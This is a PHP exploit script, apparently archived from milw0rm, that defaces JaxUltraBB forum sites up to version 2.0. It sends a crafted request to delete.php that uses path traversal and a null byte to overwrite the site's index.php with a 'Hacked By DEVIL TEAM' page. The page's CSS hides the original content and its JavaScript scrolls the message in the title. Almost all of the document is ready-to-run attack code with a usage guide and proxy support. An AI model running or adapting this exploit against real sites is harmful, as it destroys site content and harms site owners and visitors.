#!/usr/bin/php -q -d short_open_tag=on
<?
print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 
JaxUltraBB <= 2.0 (delete.php) Defaced Exploit 
[Script name: JaxUltraBB 2.0
[Script site: http://heanet.dl.sourceforge.net/sourceforge/jubb/jubb_2.0.zip
Find by: Kacper (a.k.a Rahim)
(c)od3d by Kacper
DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam
Contact: kacper1964@yahoo.pl
or
http://www.rahim.webd.pl/
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon 
TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko., CrazzyIwan, Rammstein
Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
mIvus, nukedclx, SkD, wacky
';

if ($argc<3) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      JaxUltraBB path
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /JaxUltraBB/
php '.$argv[0].' 2.2.2.2 /JaxUltraBB/ -P1.1.1.1:80
-----------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];

$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$hauru='<STYLE =text/css>BODY { 
SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: darkgray; SCROLLBAR-3DLIGHT-COLOR: #eeeeee; SCROLLBAR-ARROW-COLOR: #000000; SCROLLBAR-TRACK-COLOR: gray; SCROLLBAR-DARKSHADOW-COLOR: #000000 
} 
A:link { 
COLOR: darkblue; TEXT-DECORATION: none 
} 
A:visited { 
COLOR: #000088; TEXT-DECORATION: none 
} 
A:hover { 
COLOR: #000000 
} 
body, td, th { 
color: #000000; 
} 
table, p, td, tr 
{ 
visibility:hidden; 
} 
body { 
background-color: #000000; 
background-image: url("http://img89.imageshack.us/img89/5125/hackpo6.jpg"); 
} 
</STYLE> 
<script language="JavaScript"> 
var left="{"; 
var right="}"; 
var msg="  - - Hacked By DEVIL TEAM .:We Ownz You!:. - -  "; 
var speed=200; 
function scroll_title() { 
document.title=left+msg+right; 
msg=msg.substring(1,msg.length)+msg.charAt(0); 
setTimeout("scroll_title()",speed); 
} 
scroll_title(); 
</script>';


$packet ="GET ".$p."delete.php?modtype=%3Cimg%20src=img/admin.jpg%3E&forum=../index.php%00&contents=".$hauru." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);

echo "Site defaced ;] look to index.php";
echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam";
?>

# milw0rm.com [2006-10-22]
            